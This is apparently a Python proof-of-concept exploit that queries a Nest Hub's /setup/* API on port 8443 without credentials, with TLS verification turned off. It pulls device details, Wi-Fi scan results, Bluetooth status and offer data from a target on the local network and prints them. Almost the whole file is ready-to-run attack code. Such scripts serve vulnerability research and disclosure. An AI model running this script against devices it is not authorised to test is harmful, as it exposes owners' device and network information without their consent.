#!/usr/bin/env python3
"""
Read the Nest Hub setup API over TLS (8443) without any credential.

Over plain HTTP (8008) the /setup/* endpoints answer 401. Over TLS (8443) the
same endpoints answer 200 to anyone on the LAN, because the device accepts any
client that does a TLS handshake -- the certificate is self-signed and never
verified by the client.

Usage: python3 eureka_tls.py 192.168.178.124
"""
import json
import ssl
import sys
import urllib.request

ENDPOINTS = [
    "/setup/eureka_info?options=detail",
    "/setup/scan_results",
    "/setup/bluetooth/status",
    "/setup/offer",
]


def fetch(host: str, path: str, timeout: int = 8) -> tuple[int, bytes]:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    url = f"https://{host}:8443{path}"
    try:
        with urllib.request.urlopen(url, context=ctx, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.178.124"
    for path in ENDPOINTS:
        code, body = fetch(host, path)
        print(f"=== {path} -> HTTP {code} ({len(body)} bytes) ===")
        try:
            print(json.dumps(json.loads(body), indent=2, ensure_ascii=False)[:1500])
        except Exception:
            print(body[:500])
        print()
    return 0


if __name__ == "__main__":
    sys.exit(main())
